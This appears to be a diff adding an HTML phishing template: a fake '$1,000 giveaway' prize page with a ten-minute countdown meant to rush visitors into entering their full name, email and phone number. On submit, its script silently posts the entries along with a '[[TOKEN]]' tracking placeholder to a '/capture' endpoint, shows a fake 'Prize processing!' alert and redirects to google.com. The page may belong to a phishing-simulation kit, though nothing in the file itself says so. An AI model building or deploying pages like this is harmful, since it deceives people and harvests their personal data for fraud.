@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>You Won $1000!</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+.container{background:#fff;border-radius:24px;max-width:500px;width:100%;padding:40px;text-align:center;animation:pulse 1.5s infinite}
+@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.02)}100%{transform:scale(1)}}
+.trophy{font-size:80px;margin-bottom:20px}
+h1{color:#ff9800;margin-bottom:10px;font-size:32px}
+.amount{font-size:64px;font-weight:bold;color:#4caf50;margin:20px 0}
+.timer{background:#f5f5f5;padding:15px;border-radius:12px;margin:20px 0}
+.countdown{font-size:48px;font-weight:bold;color:#ff4444}
+input{width:100%;padding:14px;margin:8px 0;border:2px solid #e0e0e0;border-radius:8px;font-size:16px}
+button{width:100%;background:linear-gradient(45deg,#ff9800,#ff5722);color:#fff;padding:16px;border:none;border-radius:40px;font-size:18px;font-weight:bold;cursor:pointer}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="trophy">🏆💰</div>
+<h1>CONGRATULATIONS!</h1>
+<p>You've been selected as the WINNER of our</p>
+<div class="amount">$1,000 GIVEAWAY!</div>
+<div class="timer"><div class="countdown" id="timer">10:00</div></div>
+<form id="claimForm">
+<input type="text" id="name" placeholder="Full Name" required>
+<input type="email" id="email" placeholder="Email Address" required>
+<input type="tel" id="phone" placeholder="Phone Number" required>
+<button type="submit">CLAIM NOW →</button>
+</form>
+</div>
+<script>
+let timeLeft=600;
+setInterval(()=>{const m=Math.floor(timeLeft/60),s=timeLeft%60;document.getElementById('timer').innerHTML=m+":"+String(s).padStart(2,'0');if(timeLeft>0)timeLeft--},1000);
+document.getElementById('claimForm').addEventListener('submit',async(e)=>{e.preventDefault();await fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:'[[TOKEN]]',data:{name:document.getElementById('name').value,email:document.getElementById('email').value,phone:document.getElementById('phone').value}})});alert('✅ Prize processing!');window.location.href='https://google.com'});
+</script>
+</body>
+</html>
